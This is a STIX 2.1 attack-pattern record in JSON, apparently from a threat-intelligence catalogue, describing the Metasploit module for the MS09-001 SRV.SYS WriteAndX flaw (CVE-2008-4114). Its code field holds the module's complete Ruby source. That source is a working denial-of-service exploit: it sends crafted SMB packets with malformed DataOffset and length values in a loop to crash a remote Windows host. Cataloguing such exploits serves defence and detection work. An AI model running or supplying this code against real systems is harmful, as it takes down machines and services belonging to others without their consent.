{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1be0cb4e-bf23-4c3b-87cc-c3214d2489e0",
    "created": "2024-08-14T16:25:36.457143Z",
    "modified": "2024-08-14T16:25:36.457147Z",
    "name": "Microsoft SRV.SYS WriteAndX Invalid DataOffset",
    "description": " This module exploits a denial of service vulnerability in the SRV.SYS driver of the Windows operating system.  This module has been tested successfully against Windows Vista.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms09_001_write.rb",
            "external_id": "ms09_001_write.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4114"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SRV.SYS WriteAndX Invalid DataOffset',\n      'Description'    => %q{\n          This module exploits a denial of service vulnerability in the\n        SRV.SYS driver of the Windows operating system.\n\n        This module has been tested successfully against Windows Vista.\n      },\n\n      'Author'         => [ 'j.v.vallejo[at]gmail.com' ],\n      'License'        => MSF_LICENSE,\n      'References' =>\n        [\n          ['MSB', 'MS09-001'],\n          ['OSVDB', '48153'],\n          ['CVE', '2008-4114'],\n          ['BID', '31179'],\n        ]\n      )\n    )\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n\n  def send_smb_pkt(dlenlow, doffset,fillersize)\n\n    connect(versions: [1])\n    smb_login()\n\n    pkt = CONST::SMB_CREATE_PKT.make_struct\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0xc807\n\n    pkt['Payload']['SMB'].v['MultiplexID'] = simple.client.multiplex_id.to_i\n    pkt['Payload']['SMB'].v['TreeID'] = simple.client.last_tree_id.to_i\n    pkt['Payload']['SMB'].v['UserID'] = simple.client.auth_user_id.to_i\n    pkt['Payload']['SMB'].v['ProcessID'] = simple.client.process_id.to_i\n\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX\n\n    pkt['Payload']['SMB'].v['WordCount'] = 24\n\n    pkt['Payload'].v['AndX'] = 255\n    pkt['Payload'].v['AndXOffset'] = 0xdede\n    pkt['Payload'].v['FileNameLen'] = 14\n    pkt['Payload'].v['CreateFlags'] = 0x16\n    pkt['Payload'].v['AccessMask'] = 0x2019f  # Maximum Allowed\n    pkt['Payload'].v['ShareAccess'] = 7\n    pkt['Payload'].v['CreateOptions'] = 0x400040\n    pkt['Payload'].v['Impersonation'] = 2\n    pkt['Payload'].v['Disposition'] = 1\n    pkt['Payload'].v['Payload'] = \"\\x00\\\\\\x00L\\x00S\\x00A\\x00R\\x00P\\x00C\" + \"\\x00\\x00\"\n\n\n    simple.client.smb_send(pkt.to_s)\n    ack = simple.client.smb_recv_parse(CONST::SMB_COM_NT_CREATE_ANDX)\n\n    pkt = CONST::SMB_WRITE_PKT.make_struct\n    data_offset = pkt.to_s.length - 4\n    filler = Rex::Text.rand_text(fillersize)\n\n    pkt['Payload']['SMB'].v['Signature1']=0xcccccccc\n    pkt['Payload']['SMB'].v['Signature2']=0xcccccccc\n    pkt['Payload']['SMB'].v['MultiplexID'] = simple.client.multiplex_id.to_i\n    pkt['Payload']['SMB'].v['TreeID'] = simple.client.last_tree_id.to_i\n    pkt['Payload']['SMB'].v['UserID'] = simple.client.auth_user_id.to_i\n    pkt['Payload']['SMB'].v['ProcessID'] = simple.client.process_id.to_i\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_WRITE_ANDX\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0xc807\n    pkt['Payload']['SMB'].v['WordCount'] = 14\n    pkt['Payload'].v['AndX'] = 255\n    pkt['Payload'].v['AndXOffset'] = 0xdede\n    pkt['Payload'].v['FileID'] = ack['Payload'].v['FileID']\n    pkt['Payload'].v['Offset'] = 0\n    pkt['Payload'].v['Reserved2'] = -1\n    pkt['Payload'].v['WriteMode'] = 8\n    pkt['Payload'].v['Remaining'] = fillersize\n    pkt['Payload'].v['DataLenHigh'] = 0\n    pkt['Payload'].v['DataLenLow'] = dlenlow #<==================\n    pkt['Payload'].v['DataOffset'] = doffset #<====\n    pkt['Payload'].v['DataOffsetHigh'] = 0xcccccccc #<====\n    pkt['Payload'].v['ByteCount'] = fillersize #<====\n    pkt['Payload'].v['Payload'] = filler\n\n    simple.client.smb_send(pkt.to_s)\n  end\n\n  def run\n\n    print_line(\"Attempting to crash the remote host...\")\n    k=72\n    j=0xffff\n    while j>10000\n      i=0xffff\n      while i>10000\n        begin\n          print_line(\"datalenlow=#{i} dataoffset=#{j} fillersize=#{k}\")\n          send_smb_pkt(i,j,k)\n        rescue\n          print_line(\"rescue\")\n        end\n        i=i-10000\n      end\n      j=j-10000\n    end\n  end\nend\n"
}